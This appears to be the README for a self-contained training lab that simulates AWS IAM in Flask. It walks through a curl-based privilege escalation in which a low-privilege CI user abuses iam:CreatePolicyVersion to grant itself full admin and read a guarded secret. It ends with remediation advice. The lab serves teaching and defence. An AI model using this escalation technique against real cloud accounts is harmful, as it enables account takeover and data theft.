Cloud Lab 03. AWS-IAM-Privesc — Flask (Python), self-contained  ✅ (exploit verified on this box)

A minimal IAM control plane that ACTUALLY ENFORCES policy, so the privilege-
escalation exploit produces a real access-denied -> access-granted flip you can
see. Identity is passed via the X-Access-Key header (stands in for SigV4). The
low-priv user dev-ci is attached to the customer-managed policy dev-ci-boundary,
whose v1 allows iam:Get*/List* and — dangerously — iam:CreatePolicyVersion on
that same policy. That one permission lets the attacker publish a new DEFAULT
policy version granting *:*, becoming admin. (A classic IAM privesc primitive.)

1: Get the lab:   unzip AWS-IAM-Privesc.zip && cd 03-AWS-IAM-Privesc
2: Deploy (native — verified here):   ./run.sh        # (or: python3 app.py)  needs Flask
   Open in browser:   http://localhost:9133/          <-- {"app":"IAM (enforcing)...",...}
   Attacker's low-priv key:   X-Access-Key: AKIADEVCI0000000EXMPL
   # Quick win — deny -> escalate -> allow:
   K='X-Access-Key: AKIADEVCI0000000EXMPL'
   curl -s -H "$K" localhost:9133/iam/whoami                         # dev-ci, limited actions
   curl -s -o /dev/null -w '%{http_code}\n' -H "$K" localhost:9133/admin/secret   # 403 (denied)
   curl -s -H "$K" localhost:9133/iam/account-authorization-details  # recon: has CreatePolicyVersion
   # escalate: publish a *:* default version of the policy attached to us
   curl -s -H "$K" -H 'Content-Type: application/json' -X POST \
     localhost:9133/iam/create-policy-version \
     -d '{"PolicyArn":"arn:aws:iam::123456789012:policy/dev-ci-boundary","PolicyDocument":{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]},"SetAsDefault":true}'
   curl -s -H "$K" localhost:9133/admin/secret                       # 200 now -> crown jewels
   #   -> {"SecretString":"crown-jewels: root account recovery code = ACME-ROOT-9c2f-EXAMPLE"}
3: Stop:  Ctrl-C

Requirements:
    Python 3 + Flask                (native run — no Docker, no AWS account)
    curl

Endpoints:
    GET  /iam/whoami                            -> caller + effective actions
    GET  /iam/account-authorization-details     -> users, policies, versions (recon)
    POST /iam/create-policy-version             -> publish a policy version   [PRIVESC PRIMITIVE]
    POST /iam/attach-user-policy               -> attach a policy (denied pre-privesc)
    GET  /admin/secret                          -> guarded crown-jewels (needs admin)

List of Vulnerabilities (all verified on this box):
    IAM privilege escalation via iam:CreatePolicyVersion — dev-ci can set a new
        default version of an attached policy, granting itself *:* (admin).
    Over-permissive managed policy — a low-priv CI user is granted a dangerous
        IAM write action on a policy attached to itself.
    Real enforcement proof — /admin/secret returns 403 before the escalation and
        200 (crown jewels) after, confirming the privilege boundary was broken.

Remediation: never grant iam:CreatePolicyVersion / SetDefaultPolicyVersion (or
iam:AttachUserPolicy, iam:PutUserPolicy, iam:PassRole, etc.) to non-admins; use
permission boundaries; audit with IAM Access Analyzer; alert on CreatePolicyVersion.
